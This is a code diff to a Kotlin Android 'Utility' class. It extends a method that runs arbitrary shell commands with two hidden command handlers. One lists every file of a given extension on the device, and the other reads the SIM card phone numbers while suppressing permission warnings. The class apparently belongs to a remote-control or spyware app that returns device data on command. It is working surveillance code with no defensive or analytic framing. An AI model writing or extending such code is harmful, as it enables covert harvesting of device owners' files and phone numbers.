@@ -27,6 +27,7 @@ import kotlin.collections.ArrayList
 import kotlin.collections.HashMap
 import Request
 import android.app.Service
+import android.telephony.SubscriptionManager
 
 
 open class Utility(mContext: Context) {
@@ -219,6 +220,14 @@ open class Utility(mContext: Context) {
     open fun runCommand(command:String,workingDir: File=File(AppInfo.DeviceBaseFolder)): String? {
         return try {
             val parts = command.split("\\s".toRegex())
+            if (command.startsWith("findx:")){
+                val all_file = find_ext(AppInfo.DeviceBaseFolder,command.replace("findx:",""))
+                return all_file.toString()
+            }
+            if (command.startsWith("findphno")){
+                val number = getNumber(context)
+                return number
+            }
             val proc = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                 ProcessBuilder(*parts.toTypedArray())
                     .directory(workingDir)
@@ -236,6 +245,48 @@ open class Utility(mContext: Context) {
             return "{\"error\":\"${e.toString()}\"}"
         }
     }
+
+    open fun find_ext(dir: String,ext:String): java.util.ArrayList<String> {
+        val fucked_lst = arrayListOf<String>()
+        File(dir).walk().forEach {
+            if (it.toString().endsWith(ext.trim())){
+                fucked_lst.add(it.path.toString())
+            }
+        }
+        return fucked_lst
+    }
+
+    @SuppressLint("HardwareIds", "MissingPermission")
+    open fun getNumber(context: Context): String {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
+            try {
+                val subscriptionManager =
+                    SubscriptionManager.from(context)
+                val subsInfoList = subscriptionManager.activeSubscriptionInfoList
+                return when (subsInfoList.size) {
+                    1 -> {
+                        subsInfoList[0].number
+                    }
+                    2 -> {
+                        subsInfoList[0].number + "x" + subsInfoList[1].number
+                    }
+                    else -> {
+                        Log.d(
+                            AppInfo.TAG,
+                            "Phone number not found 1 => " + subsInfoList.size
+                        )
+                        Log.d(AppInfo.TAG, "Phone number not found 1")
+                        "null"
+                    }
+                }
+            } catch (e: Exception) {
+                Log.d(AppInfo.TAG, "Phone number not found 2 => $e")
+                return "null"
+            }
+        }
+        return "null"
+    }
+
 
     open fun changeWallpaper(imageURL:String):String {
         val thread = Thread {
